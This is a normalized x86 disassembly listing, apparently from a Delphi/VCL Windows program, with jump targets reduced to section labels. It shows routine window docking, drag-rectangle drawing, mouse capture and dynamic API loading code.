xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_44ce30
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_447e50
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_44d053
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_44cea8
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d0a4
lea eax [ ebp - 0x14 ]
call sub_404008
retn
sub_44d0ac
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44b7fc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44b824
call sub_44d0ac
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44b7fc
call sub_44d0ac
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_44b22c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_44b724
mov edx eax
mov eax ebx
call sub_44b74c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44b74c
jmp r-xdata
sub_44d134
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_44d0ac
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_44d178
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44b724
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_44b74c
sub_44d1a8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4493d8
mov edx eax
mov eax [ rw-data ]
call sub_44dd08
mov eax [ ebx + 0x14 ]
call sub_4493d8
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_44d2bc
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44d208
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_44dd08
mov eax ebx
call sub_44d2bc
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_44b74c
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_44b74c
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44d134
push ebx
push sub_44d2ac
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44bad8
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_44d284
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_447e3c
test eax eax
jle r-xdata
push ebx
push sub_44d2ac
xor edx edx
mov eax ebx
call sub_44bad8
sub_44d2bc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_44b2f0
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_44b2f0
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_44b35c
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_44b35c
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_4242a4
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44d3a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44d3a8
pop ecx
mov eax ebx
call sub_44b724
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44b724
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44d3a8
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44b724
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42b028
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_44d438
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b724
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44b2a8
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_44b724
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44d3a8
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44d488
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_442558
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_442558
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_44d504
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44b1b4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_44b260
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_44b808
test eax eax
je r-xdata
mov eax esi
call sub_44b22c
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44d2ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_44bad8
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44b808
mov edx [ ebx + 0x20 ]
call sub_44b760
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_44d504
pop ecx
sub_44d584
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44b210
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_44b210
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_44b808
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_44d584
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44d2ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_44bad8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_44b40c
mov eax edi
call sub_44b7fc
test eax eax
je r-xdata
mov eax edi
call sub_44b808
mov esi eax
mov eax esi
call sub_44b724
push eax
mov eax esi
call sub_44b260
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_44b7fc
call sub_44b724
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_44b724
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_44b74c
mov eax esi
call sub_44b724
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44b74c
mov eax edi
call sub_44b808
call sub_44b79c
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_44b260
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44b74c
mov eax edi
call sub_44b7fc
call sub_44b79c
mov bl 0x1
jmp r-xdata
sub_44d6bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44ba70
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_41900c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44c264
test eax eax
je r-xdata
push ebp
call sub_44d504
pop ecx
push ebp
call sub_44d584
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44d488
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_44d744
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_44b2f0
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_44b2f0
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44d438
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44d438
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_44d7d4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44dbac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406dd8
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44c264
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d208
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406dd8
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44c264
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4426fc
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dbb3
lea eax [ ebp - 0x48 ]
call sub_404008
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4493d8
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_441418
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_4438b8
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404008
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_44d6bc
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_447ed0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d2bc
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406dd8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_44d744
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44d2bc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406dd8
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44c264
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_442ad8
jmp r-xdata
mov eax edi
call sub_45eff8
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44c264
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_442558
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_442bb8
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_40405c
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d1a8
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4606f8
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4493d8
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_443260
jmp r-xdata
sub_44dbbc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403558
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_44dd30
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_44dc4c
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44dd08
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_44dcb0
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_44dce0
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406ecc
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_44dd08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44dc7c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_44dd30
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_44dc94
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_44dcb0
pop ebx
retn
mov eax ebx
call sub_44dce0
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_44dd94
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44defa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44e018
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44dffc
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_44dffc
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44e108
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403234
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403234
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403234
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403234
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404008
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404008
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44e190
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44e308
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_40905c
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_40405c
mov eax [ rw-data ]
call sub_4044c8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
